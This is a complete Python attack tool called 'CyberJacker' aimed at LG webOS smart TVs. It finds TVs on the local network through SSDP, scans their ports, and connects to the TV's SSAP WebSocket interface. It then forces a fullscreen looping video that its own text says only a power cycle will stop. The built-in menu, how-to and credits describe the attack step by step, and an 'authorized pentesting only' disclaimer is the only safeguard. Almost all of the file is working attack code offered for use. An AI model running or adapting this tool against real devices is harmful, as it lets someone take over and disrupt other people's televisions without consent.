#   
import socket  
import sys  
import os  
import time  
import json  
import base64  
import struct  
import re  
import threading  
import requests  
from http.server import HTTPServer, BaseHTTPRequestHandler  
from urllib.parse import urlparse  
  
os.system("")  
  
def c(text, color="white"):  
    colors = {"red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m", "blue": "\033[94m", "white": "\033[97m", "reset": "\033[0m", "bold": "\033[1m"}  
    return f"{colors.get(color, colors['white'])}{text}{colors['reset']}"  
  
def border(text, color="red"):  
    ln = max(len(l) for l in text.split("\n"))  
    top = c("**╔**" + "**═**" * (ln + 2) + "**╗**", color)  
    bot = c("**╚**" + "**═**" * (ln + 2) + "**╝**", color)  
    mid = "\n".join(c("**║** ", color) + l + " " * (ln - len(l)) + c(" **║**", color) for l in text.split("\n"))  
    return f"{c('**█**' * (ln + 4), 'white')}\n{top}\n{mid}\n{bot}\n{c('**█**' * (ln + 4), 'white')}"  
  
def show_banner():  
    os.system("cls" if os.name == "nt" else "clear")  
    banner = c(r"""  
 **██████╗██╗**   **██╗██████╗** **███████╗██████╗**     **██╗** **█████╗**  **██████╗██╗**  **██╗███████╗██████╗**  
**██╔════╝╚██╗** **██╔╝██╔══██╗██╔════╝██╔══██╗**    **██║██╔══██╗██╔════╝██║** **██╔╝██╔════╝██╔══██╗**  
**██║**      **╚████╔╝** **██████╔╝█████╗**  **██████╔╝**    **██║███████║██║**     **█████╔╝** **█████╗**  **██████╔╝**  
**██║**       **╚██╔╝**  **██╔══██╗██╔══╝**  **██╔══██╗**    **██║██╔══██║██║**     **██╔═██╗** **██╔══╝**  **██╔══██╗**  
**╚██████╗**   **██║**   **██████╔╝███████╗██║**  **██║**    **██║██║**  **██║╚██████╗██║**  **██╗███████╗██║**  **██║**  
 **╚═════╝**   **╚═╝**   **╚═════╝** **╚══════╝╚═╝**  **╚═╝**    **╚═╝╚═╝**  **╚═╝** **╚═════╝╚═╝**  **╚═╝╚══════╝╚═╝**  **╚═╝**  
""", "red")  
    title = border("                 LG WebOS TV CyberJacker v1.0\n          Auto-Discovery & WebSocket Exploitation\n                For Authorized Pentesting Only", "red")  
    print(banner)  
    print(title)  
    print()  
  
def discover_tvs(timeout=5):  
    print(c(f"[*] Scanning network for LG TVs via SSDP ({timeout}s)...", "yellow"))  
    ssdp_addr = "239.255.255.250"  
    ssdp_port = 1900  
    msearch = (  
        "M-SEARCH * HTTP/1.1\r\n"  
        "HOST: 239.255.255.250:1900\r\n"  
        "MAN: \"ssdp:discover\"\r\n"  
        "MX: 3\r\n"  
        "ST: urn:schemas-upnp-org:device:MediaRenderer:1\r\n"  
        "USER-AGENT: CyberJacker/1.0\r\n"  
        "\r\n"  
    )  
    tvs = {}  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)  
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
    sock.settimeout(timeout)  
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)  
    try:  
        sock.sendto(msearch.encode(), (ssdp_addr, ssdp_port))  
    except:  
        pass  
    start = time.time()  
    while time.time() - start < timeout:  
        try:  
            data, addr = sock.recvfrom(2048)  
            ip = addr[0]  
            body = data.decode("utf-8", errors="ignore").upper()  
            if "LG" in body or "LG ELECTRONICS" in body or "WEBOS" in body:  
                tvs[ip] = {"ip": ip, "name": "LG WebOS TV"}  
            elif "LOCATION" in body:  
                loc_match = re.search(r"LOCATION:\s*(https?://[^\r\n]+)", data.decode("utf-8", errors="ignore"), re.I)  
                tvs[ip] = {"ip": ip, "name": "Unknown Device"}  
        except socket.timeout:  
            break  
        except:  
            continue  
    sock.close()  
  
    for ip in list(tvs.keys()):  
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        s.settimeout(1)  
        if s.connect_ex((ip, 3000)) == 0 or s.connect_ex((ip, 3001)) == 0:  
            tvs[ip]["webos"] = True  
        else:  
            tvs[ip]["webos"] = False  
        s.close()  
  
    return [t for t in tvs.values() if t["webos"]]  
  
def scan_tv(target_ip):  
    print(c(f"\n[+] Scanning {target_ip} for open ports...", "yellow"))  
    ports = [3000, 3001, 5000, 8080]  
    open_ports = []  
    for port in ports:  
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        s.settimeout(2)  
        res = s.connect_ex((target_ip, port))  
        if res == 0:  
            open_ports.append(port)  
            print(c(f"    PORT {port}/TCP  OPEN", "green"))  
        else:  
            print(c(f"    PORT {port}/TCP  CLOSED", "red"))  
        s.close()  
    return open_ports  
  
def get_tv_info(target_ip):  
    try:  
        r = requests.get(f"http://{target_ip}:8080/udap/api/data", timeout=5)  
        if r.status_code == 200:  
            print(c(f"\n[+] UDAP API accessible at {target_ip}:8080", "green"))  
            print(c(f"    Response: {r.text[:200]}", "blue"))  
            return True  
    except:  
        print(c("\n[-] UDAP API not accessible", "red"))  
    return False  
  
class WSock:  
    def __init__(self, ip, port=3000):  
        self.ip = ip  
        self.port = port  
        self.sock = None  
        self.key = base64.b64encode(os.urandom(16)).decode()  
  
    def connect(self):  
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        self.sock.settimeout(10)  
        self.sock.connect((self.ip, self.port))  
        self._handshake()  
  
    def _handshake(self):  
        req = (f"GET / HTTP/1.1\r\n"  
               f"Host: {self.ip}:{self.port}\r\n"  
               f"Upgrade: websocket\r\n"  
               f"Connection: Upgrade\r\n"  
               f"Sec-WebSocket-Key: {self.key}\r\n"  
               f"Sec-WebSocket-Version: 13\r\n\r\n")  
        self.sock.send(req.encode())  
        resp = self.sock.recv(4096).decode()  
        if "101" not in resp:  
            raise Exception("Handshake failed")  
  
    def send(self, uri, payload=None):  
        if payload:  
            data = json.dumps({"type": "request", "uri": uri, "payload": payload})  
        else:  
            data = json.dumps({"type": "request", "uri": uri})  
        frame = self._frame(data.encode())  
        self.sock.send(frame)  
        time.sleep(0.5)  
        return self._recv()  
  
    def _frame(self, data):  
        frame = bytearray()  
        frame.append(0x81)  
        mask_key = os.urandom(4)  
        length = len(data)  
        if length < 126:  
            frame.append(0x80 | length)  
        elif length < 65536:  
            frame.append(0x80 | 126)  
            frame.extend(length.to_bytes(2, "big"))  
        else:  
            frame.append(0x80 | 127)  
            frame.extend(length.to_bytes(8, "big"))  
        frame.extend(mask_key)  
        frame.extend(b ^ mask_key[i % 4] for i, b in enumerate(data))  
        return bytes(frame)  
  
    def _recv(self):  
        data = self.sock.recv(8192)  
        return data  
  
    def close(self):  
        if self.sock:  
            self.sock.close()  
  
def launch_and_lock(ip, port, video_url):  
    try:  
        ws = WSock(ip, port)  
        ws.connect()  
        print(c(f"\n[+] WebSocket connected to {ip}:{port}", "green"))  
  
        pair_payload = {"client-key": "cyberjacker_pentest_001", "value": "CyberJacker"}  
        ws.send("ssap://api/getServiceList", pair_payload)  
        print(c("[*] Registered with TV as CyberJacker client", "yellow"))  
  
        ws.send("ssap://system.launcher/getForegroundAppInfo")  
        print(c("[*] Got current app state", "yellow"))  
  
        open_payload = {"target": video_url}  
        ws.send("ssap://system.launcher/open", open_payload)  
        print(c(f"[+] URL sent to TV: {video_url[:80]}...", "green"))  
  
        ws.send("ssap://media.viewer/sendMedia", {  
            "url": video_url,  
            "title": "CyberJacker Lockdown",  
            "description": "Press EXIT or restart TV to escape",  
            "icon": "",  
            "thumbnail": "",  
            "playMode": "fullScreen",  
            "autoPlay": True,  
            "loopMode": True,  
            "subtitle": "",  
            "mediaOption": "transaction",  
            "smartShare": True  
        })  
        print(c("[+] Fullscreen lockdown media sent - looping indefinitely", "green"))  
        print(c("[+] TV should now be displaying your content", "green"))  
        print(c("[!] Only a hard power cycle (unplug or hold power) will stop it", "red"))  
  
        for i in range(30, 0, -1):  
            sys.stdout.write(c(f"\r[*] Holding connection open... {i}s remaining before auto-disconnect", "yellow"))  
            sys.stdout.flush()  
            time.sleep(1)  
        print()  
  
        ws.close()  
        return True  
  
    except Exception as e:  
        print(c(f"\n[-] Failed: {e}", "red"))  
        return False  
  
def menu():  
    while True:  
        print(c("\n**┌──────────────────────────────────────────┐**", "red"))  
        print(c("│", "red") + c("  [1] Scanmap  -  Auto-find TV & Attack   ", "white") + c("│", "red"))  
        print(c("│", "red") + c("  [2] How to?  -  Instructions          ", "white") + c("│", "red"))  
        print(c("│", "red") + c("  [3] Credits  -  Who made this         ", "white") + c("│", "red"))  
        print(c("│", "red") + c("  [4] Exit                              ", "white") + c("│", "red"))  
        print(c("**└──────────────────────────────────────────┘**", "red"))  
        choice = input(c("\n[>] Select: ", "yellow")).strip()  
  
        if choice == "1":  
            scanmap()  
        elif choice == "2":  
            howto()  
        elif choice == "3":  
            credits()  
        elif choice == "4":  
            print(c("\n[+] Exiting CyberJacker. Stay sharp.", "green"))  
            sys.exit(0)  
        else:  
            print(c("[-] Invalid option", "red"))  
  
def scanmap():  
    print(c("\n**═══════════════════════════════════════════**", "blue"))  
    print(c("           SCANMAP - ATTACK MODULE        ", "red"))  
    print(c("**═══════════════════════════════════════════**", "blue"))  
  
    print(c("\n[*] Discovering LG TVs on your network...", "green"))  
    found_tvs = discover_tvs(timeout=5)  
  
    if not found_tvs:  
        print(c("[-] No LG TVs found automatically.", "red"))  
        manual = input(c("[?] Enter TV IP manually (or press Enter to go back): ", "yellow")).strip()  
        if not manual:  
            return  
        target = manual  
    elif len(found_tvs) == 1:  
        target = found_tvs[0]["ip"]  
        print(c(f"[+] Found 1 TV: {target}", "green"))  
    else:  
        print(c(f"[+] Found {len(found_tvs)} LG TVs:", "green"))  
        for i, tv in enumerate(found_tvs):  
            print(c(f"    [{i+1}] {tv['ip']}", "yellow"))  
        sel = input(c("[?] Select TV number: ", "yellow")).strip()  
        try:  
            target = found_tvs[int(sel)-1]["ip"]  
        except:  
            print(c("[-] Invalid selection.", "red"))  
            return  
  
    video_url = input(c("[?] Enter raw video/image URL (or press Enter for default test video): ", "yellow")).strip()  
    if not video_url:  
        video_url = "https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/720/Big_Buck_Bunny_720_10s_1MB.mp4"  
        print(c(f"[*] Using default test video", "yellow"))  
  
    print(c(f"\n[+] Target TV IP: {target}", "green"))  
    print(c(f"[+] Video URL: {video_url[:80]}...", "green"))  
  
    print(c("\n[+] Starting reconnaissance...", "green"))  
    open_ports = scan_tv(target)  
  
    if not open_ports:  
        print(c("\n[-] No open ports found. TV might be off, on different network, or patched.", "red"))  
        return  
  
    udap = get_tv_info(target)  
  
    print(c("\n[+] Attempting exploit delivery...", "green"))  
    target_port = 3001 if 3001 in open_ports else (3000 if 3000 in open_ports else None)  
  
    if not target_port:  
        print(c("[-] No WebSocket port (3000/3001) available. Cannot send commands.", "red"))  
        return  
  
    success = launch_and_lock(target, target_port, video_url)  
  
    if success:  
        print(c("\n[✓] Attack completed. TV should be displaying your media.", "green"))  
    else:  
        print(c("\n[✗] Attack failed. Try a different port or check TV firmware.", "red"))  
  
    input(c("\n[Press Enter to return to menu]", "yellow"))  
  
def howto():  
    content = """  
**═══════════════════════════════════════════════**  
              HOW TO USE CYBERJACKER  
**═══════════════════════════════════════════════**  
  
STEP 1: Make sure TV is ON and on the same network  
  
STEP 2: Run CyberJacker and select [1] Scanmap  
  
STEP 3: TV auto-discovery runs via SSDP  
  - If found, it shows you the IP  
  - If multiple found, you pick one  
  - If none found, you enter IP manually  
  
STEP 4: Enter your raw video/image URL  
  - Must be a direct .mp4 or .jpg link  
  - Host one: python3 -m http.server 80  
  - Or use a public test video  
  
STEP 5: Sit back - script scans ports and launches  
  
HOW IT WORKS:  
  - Sends SSDP M-SEARCH to find LG TVs  
  - Connects via WebSocket on port 3000/3001  
  - Opens the URL in TV browser (system.launcher/open)  
  - Sends fullscreen looping media command  
  - TV is locked until hard power cycle  
  
HOW TO ESCAPE:  
  - Hold power button on TV for 10 seconds  
  - Or unplug the TV  
  
REQUIREMENTS:  
  - LG WebOS TV (2014-2020 ideal)  
  - Same network as TV  
  - Python 3 + requests module  
**═══════════════════════════════════════════════**"""  
    print(c(content, "blue"))  
    input(c("\n[Press Enter to return to menu]", "yellow"))  
  
def credits():  
    content = """  
**═══════════════════════════════════════════════**  
                CREDITS  
**═══════════════════════════════════════════════**  
  
  CyberJacker v1.0  
  LG WebOS TV Penetration Testing Tool  
  
  Created for authorized cybersecurity  
  professionals and educational use only.  
  
  Built with:  
    - Python 3  
    - WebSocket raw protocol (SSAP)  
    - SSDP network discovery  
    - LG UDAP API research  
  
  Research references:  
    - SSD Disclosure: LG WebOS TV  
    - CVE-2018-17173  
    - Klattimer/LGWebOSRemote  
    - PyWebOSTV library  
  
  DISCLAIMER:  
    For AUTHORIZED pentesting only.  
    Unauthorized use is illegal.  
  
**═══════════════════════════════════════════════**"""  
    print(c(content, "blue"))  
    input(c("\n[Press Enter to return to menu]", "yellow"))  
  
if __name__ == "__main__":  
    try:  
        show_banner()  
        menu()  
    except KeyboardInterrupt:  
        print(c("\n\n[!] Interrupted. Exiting...", "red"))  
        sys.exit(0)  
